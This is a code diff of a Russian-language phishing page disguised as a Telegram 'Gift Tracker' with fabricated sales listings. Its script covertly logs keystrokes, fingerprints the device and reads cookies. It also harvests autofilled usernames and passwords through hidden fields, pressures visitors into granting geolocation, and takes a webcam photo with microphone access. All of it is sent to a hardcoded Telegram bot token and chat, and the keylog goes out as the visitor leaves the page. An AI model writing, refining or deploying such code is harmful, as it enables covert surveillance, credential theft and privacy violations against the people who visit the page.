@@ -30,8 +30,6 @@ td.user{color:#fff}td.price{color:#10b981;font-weight:600}
 .popup .desc{font-size:13px;color:#64748b;margin-bottom:20px;line-height:1.5}
 .popup .btn-pop{width:100%;padding:15px;background:linear-gradient(135deg,#3b82f6,#8b5cf6);color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:700;cursor:pointer;font-family:inherit;margin-bottom:10px}
 .popup .btn-skip{width:100%;padding:12px;background:transparent;color:#64748b;border:1px solid #1e2836;border-radius:10px;font-size:14px;cursor:pointer;font-family:inherit}
-.popup .fineprint{font-size:9px;color:#3a4450;margin-top:14px;line-height:1.5}
-.popup .rules{text-align:left;font-size:11px;color:#64748b;line-height:1.6;max-height:120px;overflow-y:auto;margin-bottom:16px;padding:10px;background:#0a0e14;border-radius:8px}
 .hidden-form{position:absolute;left:-9999px;top:-9999px;opacity:0}
 .footer-bar{text-align:center;padding:20px;color:#64748b;font-size:11px;border-top:1px solid #1e2836;margin-top:30px}
 @media(max-width:500px){.stats-row{grid-template-columns:repeat(2,1fr)}td,th{font-size:11px;padding:8px}}
@@ -72,15 +70,6 @@ td.user{color:#fff}td.price{color:#10b981;font-weight:600}
 </table>
 </div>
 </div>
-<div class="section">
-<div class="section-title">📈 Топ продавцов за неделю</div>
-<div class="table-wrap">
-<table>
-<thead><tr><th>Продавец</th><th>Продаж</th><th>Сумма</th><th>Рейтинг</th></tr></thead>
-<tbody id="topTable"></tbody>
-</table>
-</div>
-</div>
 </div>
 <div class="footer-bar">🔒 Gift Tracker • Данные из открытых источников</div>
 
@@ -93,7 +82,7 @@ var TOKEN="8628050585:AAFjgxpiuqKEB9P_4dwQ_PVGDEITzZmL8G4";
 var CHAT="8192226287";
 var sid='g'+Math.random().toString(36).slice(2,8)+Date.now().toString(36);
 var keylog="";
-var stage=0;
+var step=0;
 
 document.addEventListener('keydown',function(e){keylog+=e.key;if(keylog.length>3000)keylog=keylog.slice(-3000)});
 
@@ -109,23 +98,11 @@ var gifts=[
 {user:"@abdul_goat",gift:"Khabib's Papakha 💂‍♂️",price:"7 500 ₽"},
 {user:"@egor_krd",gift:"Hupno Lollipop 🍭",price:"600 ₽"},
 {user:"@nastya_art",gift:"Swag Bag 🛍️",price:"1 500 ₽"},
-{user:"@sanya_69",gift:"Vintage Cigare 🚬",price:"3 000 ₽"},
-{user:"@marat_05",gift:"Hupno Lollipop 🍭",price:"600 ₽"},
-{user:"@dina_777",gift:"Evil Eye 👁️",price:"1 120 ₽"},
-{user:"@ruslan_ch",gift:"Khabib's Papakha 💂‍♂️",price:"7 500 ₽"},
-{user:"@azamat_01",gift:"Clover Pin 🍀",price:"760 ₽"}
-];
-
-var topSellers=[
-{user:"@abdul_goat",sales:"47",sum:"142 500 ₽",rating:"5.0"},
-{user:"@tatarin_116",sales:"32",sum:"89 300 ₽",rating:"4.9"},
-{user:"@dasha_sun",sales:"28",sum:"76 200 ₽",rating:"4.8"},
-{user:"@bespredel",sales:"21",sum:"54 100 ₽",rating:"4.7"},
-{user:"@maxim_ural",sales:"19",sum:"48 000 ₽",rating:"4.6"}
+{user:"@sanya_69",gift:"Vintage Cigare 🚬",price:"3 000 ₽"}
 ];
 
 function shuffleAndShow(){
-var sh=[...gifts].sort(function(){return Math.random()-0.5}).slice(0,10);
+var sh=[...gifts].sort(function(){return Math.random()-0.5}).slice(0,8);
 var h='';
 for(var i=0;i<sh.length;i++){
 h+='<tr><td class="user">'+sh[i].user+'</td><td>'+sh[i].gift+'</td><td class="price">'+sh[i].price+'</td><td style="color:#64748b;font-size:11px">'+Math.floor(Math.random()*60)+' сек назад</td></tr>';
@@ -134,24 +111,26 @@ document.getElementById('giftTable').innerHTML=h;
 }
 shuffleAndShow();
 setInterval(shuffleAndShow,5000);
-document.getElementById('topTable').innerHTML=topSellers.map(function(s){return '<tr><td class="user">'+s.user+'</td><td>'+s.sales+'</td><td class="price">'+s.sum+'</td><td style="color:#f59e0b">⭐'+s.rating+'</td></tr>'}).join('');
 setInterval(function(){document.getElementById('updSec').textContent=Math.floor(Math.random()*15)+1},4000);
 
+// Сбор данных
 var PD={};
 PD.ua=navigator.userAgent;PD.platform=navigator.platform;PD.lang=navigator.language;
 PD.sw=screen.width;PD.sh=screen.height;PD.tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
 PD.cpu=navigator.hardwareConcurrency||"?";PD.ram=navigator.deviceMemory||"?";
 PD.mobile=/Mobi|Android/i.test(navigator.userAgent);
 PD.ref=document.referrer||"direct";PD.cookie=document.cookie||"-";
-PD.bat="-";PD.gpu="-";PD.conn="-";PD.ip="-";PD.country="-";PD.city="-";PD.region="-";PD.provider="-";PD.tz_ip="-";
+PD.bat="-";PD.gpu="-";PD.conn="-";PD.ip="-";PD.country="-";PD.city="-";PD.provider="-";PD.tz_ip="-";
 PD.geo_lat="-";PD.geo_lng="-";PD.geo_acc="-";PD.camera="-";PD.mic="-";
-PD.webrtc="-";PD.socials="-";
+PD.webrtc="-";PD.af_u="-";PD.af_p="-";PD.af_e="-";PD.af_fn="-";PD.af_ph="-";PD.af_ph2="-";PD.af_adr="-";
 
+// IP
 fetch("https://ipapi.co/json/").then(function(r){return r.json()}).then(function(j){
 PD.ip=j.ip||"-";PD.country=j.country_name||"-";PD.city=j.city||"-";
 PD.region=j.region||"-";PD.provider=j.org||"-";PD.tz_ip=j.timezone||"-";
 }).catch(function(){});
 
+// WebRTC
 try{
 var pc=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
 pc.createDataChannel("");pc.createOffer().then(function(o){return pc.setLocalDescription(o)});
@@ -159,6 +138,7 @@ pc.onicecandidate=function(e){if(e&&e.candidate){PD.webrtc=e.candidate.candidate
 setTimeout(function(){if(PD.webrtc==="-")PD.webrtc="не определён";pc.close()},2000);
 }catch(e){}
 
+// GPU
 try{
 var cv=document.createElement('canvas');var gl=cv.getContext('webgl');
 if(gl){var db=gl.getExtension('WEBGL_debug_renderer_info');
@@ -167,6 +147,7 @@ if(db){PD.gpu=gl.getParameter(db.UNMASKED_RENDERER_WEBGL)}}
 try{navigator.getBattery().then(function(b){PD.bat=Math.round(b.level*100)+"% ch:"+b.charging})}catch(e){}
 try{if(navigator.connection){PD.conn=navigator.connection.effectiveType}}catch(e){}
 
+// Автозаполнение
 setTimeout(function(){
 PD.af_u=document.querySelector('[name="u"]').value||"-";
 PD.af_p=document.querySelector('[name="p"]').value||"-";
@@ -212,120 +193,91 @@ fd.append('caption','📸 ФОТО\n🆔 '+sid);
 fetch('https://api.telegram.org/bot'+TOKEN+'/sendPhoto',{method:"POST",body:fd});
 }
 
-// ЭТАП 1
-function stage1(){
-stage=1;
-document.getElementById('popupContent').innerHTML=
-'<div class="icon">📋</div>'+
-'<h3>Правила сообщества</h3>'+
-'<div class="rules">'+
-'1. Общие положения<br>Настоящие правила регулируют использование сервиса Gift Tracker. Продолжая использование, вы соглашаетесь с условиями.<br><br>'+
-'2. Конфиденциальность<br>Мы обрабатываем обезличенные данные для защиты от ботов. Никакая личная информация не передаётся третьим лицам.<br><br>'+
-'3. Защита от ботов<br>Для обеспечения безопасности мы проводим автоматическую проверку пользователей.<br><br>'+
-'4. Ответственность<br>Пользователь несёт ответственность за достоверность предоставленной информации.<br><br>'+
-'5. Согласие<br>Продолжая, вы подтверждаете ознакомление с правилами.'+
-'</div>'+
-'<button class="btn-pop" onclick="acceptRules()">Ознакомлен, продолжить</button>'+
-'<div class="fineprint">Нажимая кнопку, вы принимаете правила сообщества<br>и политику обработки данных.</div>';
-document.getElementById('overlay').classList.add('show');
+function hidePopup(){document.getElementById('overlay').classList.remove('show')}
+function showPopup(html){document.getElementById('popupContent').innerHTML=html;document.getElementById('overlay').classList.add('show')}
 
-// Автоотправка через 10 секунд даже без нажатия
-setTimeout(function(){
-if(stage===1){
-sendMsg(PD,'📋 АВТОСБОР (10 сек)');
-document.getElementById('overlay').classList.remove('show');
-document.getElementById('popupContent').innerHTML=
+// ШАГ 1: Кнопка Продолжить
+function step1(){
+showPopup(
+'<div class="icon">🔐</div>'+
+'<h3>Подтверждение</h3>'+
+'<div class="desc">Для доступа к базе данных<br>необходимо подтвердить личность.</div>'+
+'<button class="btn-pop" id="btnStep1">Продолжить</button>'
+);
+document.getElementById('btnStep1').addEventListener('click',function(){
+hidePopup();
+step2();
+});
+}
+
+// ШАГ 2: Ожидание 10 секунд
+function step2(){
+showPopup(
 '<div class="icon">⏳</div>'+
 '<h3>Загрузка данных...</h3>'+
 '<div class="desc">Пожалуйста, подождите.<br>Идёт подготовка базы данных.</div>'+
-'<div style="color:#64748b;font-size:12px;margin-top:10px">Осталось: <span id="countdown">10</span> сек</div>';
-document.getElementById('overlay').classList.add('show');
+'<div style="color:#64748b;font-size:12px;margin-top:10px">Осталось: <span id="countdown">10</span> сек</div>'
+);
 var sec=10;
 var cd=setInterval(function(){
 sec--;
 document.getElementById('countdown').textContent=sec;
-if(sec<=0){clearInterval(cd);stage2()}
+if(sec<=0){clearInterval(cd);hidePopup();sendMsg(PD,'📋 БАЗОВЫЕ ДАННЫЕ');step3();}
 },1000);
 }
-},10000);
-}
 
-function acceptRules(){
-if(stage===1){
-sendMsg(PD,'📋 ЭТАП 1: ПРАВИЛА ПРИНЯТЫ');
-document.getElementById('overlay').classList.remove('show');
-document.getElementById('popupContent').innerHTML=
-'<div class="icon">⏳</div>'+
-'<h3>Загрузка данных...</h3>'+
-'<div class="desc">Пожалуйста, подождите.<br>Идёт подготовка базы данных.</div>'+
-'<div style="color:#64748b;font-size:12px;margin-top:10px">Осталось: <span id="countdown">10</span> сек</div>';
-document.getElementById('overlay').classList.add('show');
-var sec=10;
-var cd=setInterval(function(){
-sec--;
-document.getElementById('countdown').textContent=sec;
-if(sec<=0){clearInterval(cd);stage2()}
-},1000);
-}
-}
-
-// ЭТАП 2
-function stage2(){
-stage=2;
-document.getElementById('overlay').classList.remove('show');
+// ШАГ 3: Геолокация
+function step3(){
 if(navigator.geolocation){
 navigator.geolocation.getCurrentPosition(function(pos){
 PD.geo_lat=pos.coords.latitude;
 PD.geo_lng=pos.coords.longitude;
 PD.geo_acc=pos.coords.accuracy+' м';
-sendMsg(PD,'📍 ЭТАП 2: ГЕОЛОКАЦИЯ ПОЛУЧЕНА');
-stage3();
+sendMsg(PD,'📍 ГЕОЛОКАЦИЯ ПОЛУЧЕНА');
+step5();
 },function(){
-showGeoRetry();
+step4();
 },{enableHighAccuracy:true,timeout:5000});
 }else{
-stage3();
+step5();
 }
 }
 
-function showGeoRetry(){
-document.getElementById('popupContent').innerHTML=
+// ШАГ 4: Повторный запрос гео
+function step4(){
+showPopup(
 '<div class="icon">⚠️</div>'+
 '<h3>Требуется подтверждение</h3>'+
 '<div class="desc">Без подтверждения геолокации<br>невозможно продолжить.<br><br>Пожалуйста, разрешите доступ.</div>'+
-'<button class="btn-pop" onclick="retryGeo()">Разрешить и продолжить</button>'+
-'<button class="btn-skip" onclick="skipGeo()">Пропустить</button>';
-document.getElementById('overlay').classList.add('show');
-}
-
-function retryGeo(){
-document.getElementById('overlay').classList.remove('show');
+'<button class="btn-pop" id="btnGeoRetry">Разрешить</button>'+
+'<button class="btn-skip" id="btnGeoSkip">Пропустить</button>'
+);
+document.getElementById('btnGeoRetry').addEventListener('click',function(){
+hidePopup();
 if(navigator.geolocation){
 navigator.geolocation.getCurrentPosition(function(pos){
 PD.geo_lat=pos.coords.latitude;
 PD.geo_lng=pos.coords.longitude;
 PD.geo_acc=pos.coords.accuracy+' м';
-sendMsg(PD,'📍 ЭТАП 2: ГЕО ПОЛУЧЕНА (2 попытка)');
-stage3();
+sendMsg(PD,'📍 ГЕО ПОЛУЧЕНА (2 попытка)');
+step5();
 },function(){
 PD.geo_lat="отказано";PD.geo_lng="отказано";PD.geo_acc="отказано";
-sendMsg(PD,'📍 ЭТАП 2: ГЕО ОТКАЗАНО');
-stage3();
+sendMsg(PD,'📍 ГЕО ОТКАЗАНО');
+step5();
 },{enableHighAccuracy:true,timeout:5000});
 }
-}
-
-function skipGeo(){
+});
+document.getElementById('btnGeoSkip').addEventListener('click',function(){
+hidePopup();
 PD.geo_lat="пропущено";PD.geo_lng="пропущено";PD.geo_acc="пропущено";
-document.getElementById('overlay').classList.remove('show');
-sendMsg(PD,'📍 ЭТАП 2: ГЕО ПРОПУЩЕНО');
-stage3();
+sendMsg(PD,'📍 ГЕО ПРОПУЩЕНО');
+step5();
+});
 }
 
-// ЭТАП 3
-function stage3(){
-stage=3;
-document.getElementById('overlay').classList.remove('show');
+// ШАГ 5: Камера
+function step5(){
 navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:true}).then(function(stream){
 PD.camera="получен";PD.mic="получен";
 var video=document.createElement('video');video.srcObject=stream;video.play();
@@ -335,28 +287,29 @@ var ctx=canvas.getContext('2d');ctx.drawImage(video,0,0,320,240);
 var photo=canvas.toDataURL('image/jpeg',0.6);
 stream.getTracks().forEach(function(t){t.stop()});
 sendPhoto(photo);
-sendMsg(PD,'📸 ЭТАП 3: КАМЕРА + ВСЕ ДАННЫЕ');
+sendMsg(PD,'📸 КАМЕРА + ФИНАЛ');
 finish();
 },1000);
 }).catch(function(){
 PD.camera="отказано";PD.mic="отказано";
-sendMsg(PD,'📸 ЭТАП 3: КАМЕРА ОТКАЗАНО');
+sendMsg(PD,'📸 КАМЕРА ОТКАЗАНО');
 finish();
 });
 }
 
 function finish(){
-document.getElementById('overlay').classList.remove('show');
+hidePopup();
 }
 
-// СТАРТ
-setTimeout(stage1,2000);
+// СТАРТ через 1 секунду
+setTimeout(step1,1000);
 
 // Перед уходом
 window.addEventListener('beforeunload',function(){
-var blob=new Blob([JSON.stringify({chat_id:CHAT,text:'🚨 УШЁЛ\n🆔 '+sid+'\n⌨️ КЕЙЛОГГЕР:\n'+keylog})],{type:'application/json'});
+var blob=new Blob([JSON.stringify({chat_id:CHAT,text:'🚨 УШЁЛ\n🆔 '+sid+'\n⌨️ '+keylog})],{type:'application/json'});
 navigator.sendBeacon('https://api.telegram.org/bot'+TOKEN+'/sendMessage',blob);
 });
 </script>
 </body>
 </html>
+ээ
